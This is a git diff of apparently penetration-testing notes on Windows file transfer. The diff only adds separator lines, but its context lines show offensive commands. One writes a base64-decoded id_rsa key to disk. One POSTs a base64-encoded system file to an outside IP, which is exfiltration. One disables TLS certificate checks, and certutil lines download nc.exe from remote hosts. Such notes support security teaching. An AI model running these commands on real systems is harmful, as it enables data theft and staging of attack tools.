@@ -10,6 +10,8 @@ We can copy this content and paste it into a Windows PowerShell terminal and use
 ```
 PS C:\> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("content"))
 ```
+* * *
+
 #### PowerShell DownloadFile Method
 
 We can specify the class name Net.WebClient and the method DownloadFile with the parameters corresponding to the URL of the target file to download and the output file name.
@@ -73,6 +75,8 @@ At line:1 char:1
 PS C:\> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
 
+* * *
+
 ### SMB Downloads
 
 #### Copy a File from the SMB Server
@@ -127,6 +131,8 @@ PS C:\> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\S
 PS C:\> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
 ```
 
+* * *
+
 ### LOLBAS
 
 use CertReq.exe as an example
@@ -161,4 +167,6 @@ C:\> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
 ```
 C:\> certutil -urlcache -split -f http://10.10.10.32/nc.exe
 ```
+* * *
+
 
